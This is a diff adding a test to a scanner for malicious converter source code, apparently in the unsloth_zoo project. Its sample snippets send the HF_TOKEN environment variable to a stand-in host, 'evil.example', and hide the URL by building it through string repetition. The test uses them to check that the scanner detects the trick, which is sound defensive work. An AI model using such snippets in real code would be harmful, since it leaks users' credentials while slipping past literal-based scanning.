@@ -4387,6 +4387,38 @@ def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
     ) == []
 
 
+def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
+    """"https" * 1 + "://evil.example/c" carries its scheme in a repetition,
+    which was neither folded nor refused, so no literal in the file held a URL
+    at all. Either operand may be the count, a count this cannot read leaves a
+    hole the way an unreadable f-string piece does, and the product carries the
+    ceiling every other fold carries.
+    """
+    module = _load(
+        "converter_scan_repeat_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'url = "https" * 1 + "://evil.example/c"\n' + send,
+        'url = "https" * n + "://evil.example/c"\n' + send,
+        'url = 1 * "https" + "://evil.example/c"\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Repeating a separator is ordinary, and it names no destination.
+    assert scan_converter_source(
+        preamble + 'pad = "-" * 4\nurl = f"{HUB}/api"\n' + send
+    ) == []
+
+    import ast as ast_module
+    oversized = ast_module.parse(
+        '"' + "A" * 2_000 + '" * 1000'
+    ).body[0].value
+    assert module._literal_text(oversized) is None
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
